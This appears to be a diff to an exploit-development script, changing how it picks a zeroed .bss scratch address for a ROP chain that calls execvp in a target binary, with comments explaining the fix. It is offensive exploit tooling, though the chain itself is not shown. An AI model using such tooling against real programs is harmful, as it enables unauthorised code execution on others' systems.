@@ -95,17 +95,15 @@ def build_profile(target: str, verbose: bool = True) -> dict:
         raise RuntimeError("execvp call-site gadget not found")
     prof["execvp_call_site"] = site
 
-    # pick a large zeroed scratch region inside .bss for the ROP argv/filename
+    # Scratch region for the ROP argv/filename pointers. The chain touches only
+    # bss_base+0x8 and bss_base+0x10, and needs [bss_base+0x10] (execvp's argv)
+    # to read as 0 at runtime. .bss is NOBITS, so the file image is all-zero and
+    # scanning it tells us nothing about runtime contents -- but globals pack from
+    # the FRONT of .bss, so its TAIL reliably stays zero. Take the top of .bss,
+    # aligned down to 0x100, which leaves >=0x80 of slack for the +0x8/+0x10 reads.
     bss = elf.get_section_by_name(".bss")
-    base = bss.header.sh_addr
-    off = 0x8000
-    while off < bss.header.sh_size - 0x400:
-        if set(elf.read(base + off, 0x400)) == {0}:
-            prof["bss_base"] = base + off
-            break
-        off += 0x1000
-    else:
-        prof["bss_base"] = base + 0x8000
+    bss_end = bss.header.sh_addr + bss.header.sh_size
+    prof["bss_base"] = (bss_end - 0x80) & ~0xFF
 
     if verbose:
         v = subprocess.run([path, "--version"], capture_output=True,
